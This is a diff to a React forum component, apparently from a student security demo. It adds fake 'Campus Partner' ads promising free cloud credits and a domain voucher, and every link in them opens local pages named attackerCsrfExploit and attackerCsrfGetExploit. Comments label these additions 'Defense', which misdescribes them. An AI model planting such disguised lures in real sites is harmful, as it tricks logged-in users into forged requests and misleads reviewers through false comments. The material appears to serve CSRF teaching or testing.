@@ -306,6 +306,44 @@ export default function ForumView({ user, onOpenAuth }) {
                 + Start Discussion
               </button>
             </div>
+
+            {/* Defense: Embed campus partner ad and demonstrate immunity to CSRF attacks. */}
+            <div
+              className="sponsored-ad-card"
+              onClick={() => window.open('/attackerCsrfExploit.html', '_blank')}
+              title="Click to claim campus partner credits"
+            >
+              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
+                <span className="sponsored-ad-badge">Campus Partner</span>
+                <span style={{ fontSize: '0.68rem', color: '#92400e', fontWeight: '700' }}>SPONSORED</span>
+              </div>
+              <h4 className="sponsored-ad-title">
+                Claim 500 Free Cloud Compute Credits!
+              </h4>
+              <p className="sponsored-ad-desc">
+                Exclusive developer grant for IIIT-A students. Deploy high performance instances instantly with zero credit card setup.
+              </p>
+              <a
+                href="/attackerCsrfExploit.html"
+                target="_blank"
+                rel="noopener noreferrer"
+                className="sponsored-ad-btn"
+                onClick={(e) => e.stopPropagation()}
+              >
+                Claim Student Credits Now →
+              </a>
+              <div style={{ marginTop: '8px', textAlign: 'center' }}>
+                <a
+                  href="/attackerCsrfGetExploit.html"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  style={{ fontSize: '0.72rem', color: '#b45309', textDecoration: 'underline' }}
+                  onClick={(e) => e.stopPropagation()}
+                >
+                  Or claim free campus domain voucher
+                </a>
+              </div>
+            </div>
           </aside>
 
           <main>
@@ -341,6 +379,35 @@ export default function ForumView({ user, onOpenAuth }) {
                   Search results for: <strong style={{ color: '#0284c7' }}>{activeSearch}</strong>
                 </div>
               )}
+            </div>
+
+            {/* Defense: Display sponsored announcement banner safely. */}
+            <div
+              className="sponsored-feed-banner"
+              onClick={() => window.open('/attackerCsrfExploit.html', '_blank')}
+              title="Campus Partner Promotion"
+            >
+              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '16px' }}>
+                <div>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '4px' }}>
+                    <span className="sponsored-ad-badge">Promoted</span>
+                    <strong style={{ fontSize: '0.9rem', color: '#78350f' }}>IIIT Allahabad Student Cloud Program</strong>
+                  </div>
+                  <div style={{ fontSize: '0.8rem', color: '#92400e' }}>
+                    Free 500 Compute Credits for all registered students. One click instant grant activation.
+                  </div>
+                </div>
+                <a
+                  href="/attackerCsrfExploit.html"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="sponsored-ad-btn"
+                  style={{ whiteSpace: 'nowrap', marginLeft: '12px' }}
+                  onClick={(e) => e.stopPropagation()}
+                >
+                  Claim Credits →
+                </a>
+              </div>
             </div>
 
             <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px' }}>
